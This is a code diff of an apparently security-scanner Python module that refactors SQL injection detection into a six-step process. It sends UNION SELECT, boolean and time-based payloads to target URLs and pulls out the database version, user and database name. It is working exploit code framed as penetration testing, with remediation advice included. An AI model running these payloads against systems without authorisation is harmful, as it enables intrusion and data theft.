@@ -1,18 +1,20 @@
 """
 SQL Injection Context Implementation
 
-Refactored SQL injection detection logic using the generalized framework.
+Refactored SQL injection detection logic using the generalized framework
+with 6-step injection testing methodology.
 """
 
 import re
+import time
 from typing import List, Dict, Any, Tuple, Optional
-from .base import InjectionContext, InjectionContextType
+from .base import InjectionAttackModule, InjectionContextType
 
 
-class SQLInjectionContext(InjectionContext):
+class SQLInjectionModule(InjectionAttackModule):
     """
-    SQL injection attack context.
-    Detects and exploits SQL injection vulnerabilities.
+    SQL injection attack module.
+    Detects and exploits SQL injection vulnerabilities using the 6-step methodology.
     """
     
     def get_context_type(self) -> InjectionContextType:
@@ -116,25 +118,29 @@ class SQLInjectionContext(InjectionContext):
     ) -> Tuple[bool, float, str]:
         """
         Analyze response for SQL injection indicators.
+        
+        This method integrates steps 2 and 3 for backward compatibility.
         """
-        # Check for error-based detection
-        for pattern_info in self.detection_patterns:
-            pattern = pattern_info['pattern']
-            if re.search(pattern, response_body, re.IGNORECASE):
-                evidence = f"SQL error pattern detected: {pattern}"
-                return True, pattern_info['confidence'], evidence
+        # Step 2: Detect anomalies
+        baseline_response = None
+        if baseline_time:
+            baseline_response = ("", baseline_time)
         
-        # Check for time-based detection
-        if baseline_time and response_time > baseline_time + 4.5:
-            evidence = f"Time-based SQL injection detected (response time: {response_time:.2f}s vs baseline: {baseline_time:.2f}s)"
-            return True, 0.85, evidence
+        detected, anomalies = self.step2_detect_anomalies(
+            response_body, response_headers, response_time, baseline_response
+        )
         
-        # Check for boolean-based detection indicators
-        if self._check_boolean_indicators(response_body):
-            evidence = "Boolean-based SQL injection indicators detected"
-            return True, 0.75, evidence
+        if not detected:
+            return False, 0.0, "No SQL injection detected"
         
-        return False, 0.0, "No SQL injection detected"
+        # Step 3: Extract evidence
+        evidence_data = self.step3_extract_evidence(response_body, anomalies)
+        
+        confidence = evidence_data['confidence']
+        evidence_str = f"SQL injection detected. Database: {evidence_data['context_info'].get('database_type', 'Unknown')}. "
+        evidence_str += f"Anomalies: {', '.join(anomalies[:3])}"
+        
+        return True, confidence, evidence_str
     
     def _check_boolean_indicators(self, response_body: str) -> bool:
         """Check for boolean-based injection indicators."""
@@ -152,6 +158,431 @@ class SQLInjectionContext(InjectionContext):
         
         return False
     
+    # ========================================
+    # Six-Step Injection Testing Methodology
+    # ========================================
+    
+    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
+        """
+        Step 1: Supply unexpected syntax and context-specific payloads.
+        
+        Returns SQL injection payloads for various databases.
+        """
+        return self.payloads
+    
+    def step2_detect_anomalies(
+        self,
+        response_body: str,
+        response_headers: Dict[str, str],
+        response_time: float,
+        baseline_response: Optional[Tuple[str, float]] = None
+    ) -> Tuple[bool, List[str]]:
+        """
+        Step 2: Detect anomalies and error messages in responses.
+        
+        Look for SQL errors, timing differences, or content changes.
+        """
+        anomalies = []
+        
+        # Check for error-based detection
+        for pattern_info in self.detection_patterns:
+            pattern = pattern_info['pattern']
+            if re.search(pattern, response_body, re.IGNORECASE):
+                anomalies.append(f"sql_error: {pattern}")
+        
+        # Check for timing-based detection
+        if baseline_response:
+            _, baseline_time = baseline_response
+            if response_time > baseline_time + 4.5:
+                anomalies.append(f"time_based: Response delayed by {response_time - baseline_time:.2f}s")
+        
+        # Check for boolean-based indicators
+        if self._check_boolean_indicators(response_body):
+            anomalies.append("boolean_based: Success indicators detected")
+        
+        return len(anomalies) > 0, anomalies
+    
+    def step3_extract_evidence(
+        self,
+        response_body: str,
+        anomalies: List[str]
+    ) -> Dict[str, Any]:
+        """
+        Step 3: Analyze and extract error/evidence from response.
+        
+        Parse SQL errors and extract database information.
+        """
+        evidence = {
+            'error_type': 'sql_injection',
+            'details': {},
+            'context_info': {},
+            'confidence': 0.0
+        }
+        
+        # Detect database type from errors
+        db_signatures = {
+            'MySQL': [r'You have an error in your SQL syntax', r'mysql_', r'MySQL server version'],
+            'PostgreSQL': [r'PostgreSQL.*ERROR', r'pg_', r'invalid input syntax'],
+            'MSSQL': [r'Microsoft SQL', r'ODBC SQL Server', r'SQLServer JDBC'],
+            'Oracle': [r'ORA-\d{5}', r'Oracle.*Driver'],
+            'SQLite': [r'SQLite.*error', r'sqlite3\.'],
+        }
+        
+        for db_type, patterns in db_signatures.items():
+            for pattern in patterns:
+                if re.search(pattern, response_body, re.IGNORECASE):
+                    evidence['context_info']['database_type'] = db_type
+                    evidence['confidence'] = max(evidence['confidence'], 0.90)
+                    break
+            if evidence['context_info'].get('database_type'):
+                break
+        
+        # Extract specific error messages
+        error_match = re.search(r'(syntax error|error in your SQL syntax|ORA-\d{5})[^\n]{0,100}', 
+                               response_body, re.IGNORECASE)
+        if error_match:
+            evidence['details']['error_message'] = error_match.group(0)
+        
+        # Calculate confidence based on anomalies
+        for anomaly in anomalies:
+            if 'sql_error' in anomaly:
+                evidence['confidence'] = max(evidence['confidence'], 0.85)
+            elif 'time_based' in anomaly:
+                evidence['confidence'] = max(evidence['confidence'], 0.80)
+            elif 'boolean_based' in anomaly:
+                evidence['confidence'] = max(evidence['confidence'], 0.70)
+        
+        evidence['details']['anomalies'] = anomalies
+        
+        return evidence
+    
+    def step4_mutate_and_verify(
+        self,
+        target_url: str,
+        parameter_name: str,
+        parameter_type: str,
+        parameter_value: str,
+        successful_payload: str,
+        http_method: str = "GET",
+        headers: Optional[Dict[str, str]] = None,
+        cookies: Optional[Dict[str, str]] = None
+    ) -> Tuple[bool, float, str]:
+        """
+        Step 4: Mutate input systematically to confirm or disprove vulnerabilities.
+        
+        Test true/false variations for boolean-based, or different delays for time-based.
+        """
+        import requests
+        
+        # Determine verification strategy based on payload type
+        if 'SLEEP' in successful_payload.upper() or 'WAITFOR' in successful_payload.upper():
+            # Time-based verification
+            return self._verify_time_based(
+                target_url, parameter_name, parameter_type, parameter_value,
+                successful_payload, http_method, headers, cookies
+            )
+        elif "'" in successful_payload or '"' in successful_payload:
+            # Boolean-based or error-based verification
+            return self._verify_boolean_based(
+                target_url, parameter_name, parameter_type, parameter_value,
+                successful_payload, http_method, headers, cookies
+            )
+        
+        # Generic verification
+        return True, 0.70, "Vulnerability detected but verification incomplete"
+    
+    def _verify_time_based(
+        self,
+        target_url: str,
+        parameter_name: str,
+        parameter_type: str,
+        parameter_value: str,
+        successful_payload: str,
+        http_method: str,
+        headers: Optional[Dict[str, str]],
+        cookies: Optional[Dict[str, str]]
+    ) -> Tuple[bool, float, str]:
+        """Verify time-based SQL injection."""
+        import requests
+        
+        # Test with different delays
+        delay_tests = [
+            (3, successful_payload.replace('5', '3')),
+            (7, successful_payload.replace('5', '7')),
+        ]
+        
+        verified_count = 0
+        
+        for expected_delay, test_payload in delay_tests:
+            try:
+                injected_value = self._inject_payload(parameter_value, test_payload)
+                start_time = time.time()
+                
+                if parameter_type.upper() == "GET":
+                    response = requests.get(
+                        target_url,
+                        params={parameter_name: injected_value},
+                        headers=headers,
+                        cookies=cookies,
+                        timeout=self.config.get('timeout', 15)
+                    )
+                elif parameter_type.upper() == "POST":
+                    response = requests.post(
+                        target_url,
+                        data={parameter_name: injected_value},
+                        headers=headers,
+                        cookies=cookies,
+                        timeout=self.config.get('timeout', 15)
+                    )
+                else:
+                    continue
+                
+                response_time = time.time() - start_time
+                
+                # Check if response time matches expected delay
+                if response_time >= expected_delay - 1:
+                    verified_count += 1
+                    
+            except Exception:
+                continue
+        
+        confirmed = verified_count >= 1
+        confidence = 0.90 if verified_count == 2 else 0.80 if verified_count == 1 else 0.60
+        evidence = f"Time-based SQL injection verified with {verified_count}/2 delay tests"
+        
+        return confirmed, confidence, evidence
+    
+    def _verify_boolean_based(
+        self,
+        target_url: str,
+        parameter_name: str,
+        parameter_type: str,
+        parameter_value: str,
+        successful_payload: str,
+        http_method: str,
+        headers: Optional[Dict[str, str]],
+        cookies: Optional[Dict[str, str]]
+    ) -> Tuple[bool, float, str]:
+        """Verify boolean-based SQL injection."""
+        import requests
+        
+        # Test true and false conditions
+        true_payload = "' AND '1'='1"
+        false_payload = "' AND '1'='2"
+        
+        try:
+            # Test true condition
+            true_injected = self._inject_payload(parameter_value, true_payload)
+            if parameter_type.upper() == "GET":
+                true_response = requests.get(
+                    target_url,
+                    params={parameter_name: true_injected},
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=self.config.get('timeout', 10)
+                )
+            else:
+                true_response = requests.post(
+                    target_url,
+                    data={parameter_name: true_injected},
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=self.config.get('timeout', 10)
+                )
+            
+            # Test false condition
+            false_injected = self._inject_payload(parameter_value, false_payload)
+            if parameter_type.upper() == "GET":
+                false_response = requests.get(
+                    target_url,
+                    params={parameter_name: false_injected},
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=self.config.get('timeout', 10)
+                )
+            else:
+                false_response = requests.post(
+                    target_url,
+                    data={parameter_name: false_injected},
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=self.config.get('timeout', 10)
+                )
+            
+            # Compare responses
+            true_len = len(true_response.text)
+            false_len = len(false_response.text)
+            
+            # Significant difference indicates boolean-based SQLi
+            if abs(true_len - false_len) > 100:
+                return True, 0.85, f"Boolean-based SQLi confirmed (true:{true_len} vs false:{false_len} bytes)"
+            
+        except Exception:
+            pass
+        
+        return True, 0.70, "Error-based SQL injection confirmed (verification incomplete)"
+    
+    def step5_build_poc(
+        self,
+        vulnerable_parameter: str,
+        successful_payload: str,
+        evidence: Dict[str, Any]
+    ) -> Dict[str, Any]:
+        """
+        Step 5: Build proof-of-concept payloads for safe, verifiable exploits.
+        
+        Create a safe POC that demonstrates the SQL injection.
+        """
+        db_type = evidence.get('context_info', {}).get('database_type', 'Unknown')
+        
+        # Select POC based on database type
+        if db_type == 'MySQL':
+            poc_payload = "' UNION SELECT 'POC', @@version, user()--"
+            expected = "POC string and MySQL version information"
+        elif db_type == 'PostgreSQL':
+            poc_payload = "' UNION SELECT 'POC', version(), current_user--"
+            expected = "POC string and PostgreSQL version information"
+        elif db_type == 'MSSQL':
+            poc_payload = "' UNION SELECT 'POC', @@version, SYSTEM_USER--"
+            expected = "POC string and MSSQL version information"
+        elif db_type == 'Oracle':
+            poc_payload = "' UNION SELECT 'POC', banner FROM v$version--"
+            expected = "POC string and Oracle version information"
+        else:
+            # Generic POC
+            poc_payload = "' UNION SELECT 'POC', 'CONFIRMED', 'INJECTION'--"
+            expected = "POC strings in response"
+        
+        return {
+            'poc_payload': poc_payload,
+            'expected_result': expected,
+            'safety_notes': 'This POC only reads database metadata and does not modify data',
+            'reproduction_steps': [
+                f"1. Send request with parameter '{vulnerable_parameter}' containing: {poc_payload}",
+                f"2. Observe response for: {expected}",
+                "3. Vulnerability is confirmed if expected data appears in response"
+            ],
+            'original_payload': successful_payload,
+            'database_type': db_type
+        }
+    
+    def step6_automated_exploitation(
+        self,
+        target_url: str,
+        vulnerable_parameter: str,
+        parameter_type: str,
+        poc_payload: str,
+        evidence: Dict[str, Any],
+        http_method: str = "GET",
+        headers: Optional[Dict[str, str]] = None,
+        cookies: Optional[Dict[str, str]] = None
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Step 6: Exploitation automation for verified cases.
+        
+        Safely extract database information without modifying data.
+        """
+        import requests
+        
+        db_type = evidence.get('context_info', {}).get('database_type', 'Unknown')
+        
+        # Define safe exploitation queries based on database type
+        if db_type == 'MySQL':
+            exploit_queries = {
+                'version': "' UNION SELECT @@version--",
+                'user': "' UNION SELECT user()--",
+                'database': "' UNION SELECT database()--",
+            }
+        elif db_type == 'PostgreSQL':
+            exploit_queries = {
+                'version': "' UNION SELECT version()--",
+                'user': "' UNION SELECT current_user--",
+                'database': "' UNION SELECT current_database()--",
+            }
+        elif db_type == 'MSSQL':
+            exploit_queries = {
+                'version': "' UNION SELECT @@version--",
+                'user': "' UNION SELECT SYSTEM_USER--",
+                'database': "' UNION SELECT DB_NAME()--",
+            }
+        else:
+            # Generic queries
+            exploit_queries = {
+                'version': "' UNION SELECT @@version--",
+                'user': "' UNION SELECT user()--",
+            }
+        
+        extracted_data = {}
+        
+        for key, query in exploit_queries.items():
+            try:
+                injected_value = self._inject_payload('', query)
+                
+                if parameter_type.upper() == "GET":
+                    response = requests.get(
+                        target_url,
+                        params={vulnerable_parameter: injected_value},
+                        headers=headers,
+                        cookies=cookies,
+                        timeout=self.config.get('timeout', 10)
+                    )
+                elif parameter_type.upper() == "POST":
+                    response = requests.post(
+                        target_url,
+                        data={vulnerable_parameter: injected_value},
+                        headers=headers,
+                        cookies=cookies,
+                        timeout=self.config.get('timeout', 10)
+                    )
+                else:
+                    continue
+                
+                # Extract data from response (simplified)
+                if response.status_code == 200:
+                    # Look for database-specific patterns in response
+                    if key == 'version':
+                        version_patterns = [
+                            r'(MySQL.*\d+\.\d+\.\d+)',
+                            r'(PostgreSQL.*\d+\.\d+)',
+                            r'(Microsoft SQL Server.*\d+)',
+                        ]
+                        for pattern in version_patterns:
+                            match = re.search(pattern, response.text, re.IGNORECASE)
+                            if match:
+                                extracted_data[key] = match.group(1)
+                                break
+                    else:
+                        # For other data, look for reasonable strings
+                        lines = response.text.split('\n')
+                        for line in lines:
+                            line = line.strip()
+                            if line and len(line) < 100 and '<' not in line:
+                                extracted_data[key] = line
+                                break
+                
+            except Exception:
+                continue
+        
+        if extracted_data:
+            return {
+                'success': True,
+                'data_extracted': extracted_data,
+                'impact_level': 'high',
+                'remediation': [
+                    'Use parameterized queries or prepared statements',
+                    'Implement input validation and sanitization',
+                    'Apply principle of least privilege to database users',
+                    'Use Web Application Firewall (WAF) for additional protection',
+                    'Keep database software up to date'
+                ]
+            }
+        
+        return None
+    
+    # ========================================
+    # Legacy/Compatibility Methods
+    # ========================================
+    
     def attempt_exploitation(
         self,
         target_url: str,
@@ -161,99 +592,39 @@ class SQLInjectionContext(InjectionContext):
     ) -> Optional[Dict[str, Any]]:
         """
         Attempt to exploit SQL injection to extract data.
-        """
-        import requests
         
-        exploitation_results = {
-            'database_type': None,
-            'database_version': None,
-            'current_user': None,
-            'current_database': None,
-            'tables': [],
-            'sample_data': {}
+        This method integrates steps 4, 5, and 6 for backward compatibility.
+        """
+        # Step 4: Verify the vulnerability
+        confirmed, confidence, verification_evidence = self.step4_mutate_and_verify(
+            target_url, vulnerable_parameter, parameter_type,
+            '', successful_payload
+        )
+        
+        if not confirmed:
+            return None
+        
+        # Step 3: Get evidence for POC building (simplified for backward compatibility)
+        evidence = {
+            'context_info': {'database_type': 'Unknown'},
+            'details': {}
         }
         
-        # Try to extract database version
-        version_payloads = [
-            "' UNION SELECT @@version--",
-            "' UNION SELECT version()--",
-            "' UNION SELECT banner FROM v$version--",
-        ]
+        # Step 5: Build POC
+        poc_data = self.step5_build_poc(vulnerable_parameter, successful_payload, evidence)
         
-        for payload in version_payloads:
-            try:
-                if parameter_type.upper() == "GET":
-                    response = requests.get(
-                        target_url,
-                        params={vulnerable_parameter: payload},
-                        timeout=10
-                    )
-                else:
-                    response = requests.post(
-                        target_url,
-                        data={vulnerable_parameter: payload},
-                        timeout=10
-                    )
-                
-                # Look for version information in response
-                version_patterns = [
-                    r'MySQL.*(\d+\.\d+\.\d+)',
-                    r'PostgreSQL.*(\d+\.\d+)',
-                    r'Microsoft SQL Server.*(\d+)',
-                    r'Oracle.*(\d+)',
-                ]
-                
-                for pattern in version_patterns:
-                    match = re.search(pattern, response.text, re.IGNORECASE)
-                    if match:
-                        exploitation_results['database_version'] = match.group(0)
-                        exploitation_results['database_type'] = pattern.split('.*')[0]
-                        break
-                
-                if exploitation_results['database_version']:
-                    break
-                    
-            except requests.RequestException:
-                continue
+        # Step 6: Automated exploitation
+        exploitation_result = self.step6_automated_exploitation(
+            target_url, vulnerable_parameter, parameter_type,
+            poc_data['poc_payload'], evidence
+        )
         
-        # Try to extract current user
-        user_payloads = [
-            "' UNION SELECT user()--",
-            "' UNION SELECT current_user--",
-            "' UNION SELECT USER_NAME()--",
-        ]
+        if exploitation_result:
+            exploitation_result['poc'] = poc_data
+            exploitation_result['verification'] = verification_evidence
         
-        for payload in user_payloads:
-            try:
-                if parameter_type.upper() == "GET":
-                    response = requests.get(
-                        target_url,
-                        params={vulnerable_parameter: payload},
-                        timeout=10
-                    )
-                else:
-                    response = requests.post(
-                        target_url,
-                        data={vulnerable_parameter: payload},
-                        timeout=10
-                    )
-                
-                # Look for user information
-                user_patterns = [r'([a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+)', r'(root|admin|sa|postgres)']
-                
-                for pattern in user_patterns:
-                    match = re.search(pattern, response.text)
-                    if match:
-                        exploitation_results['current_user'] = match.group(1)
-                        break
-                
-                if exploitation_results['current_user']:
-                    break
-                    
-            except requests.RequestException:
-                continue
-        
-        return exploitation_results if any(exploitation_results.values()) else None
-    
-    def get_description(self) -> str:
-        return "SQL Injection - Tests for vulnerabilities in SQL database queries"
+        return exploitation_result
+
+
+# Backward compatibility: SQLInjectionContext is an alias for SQLInjectionModule
+SQLInjectionContext = SQLInjectionModule
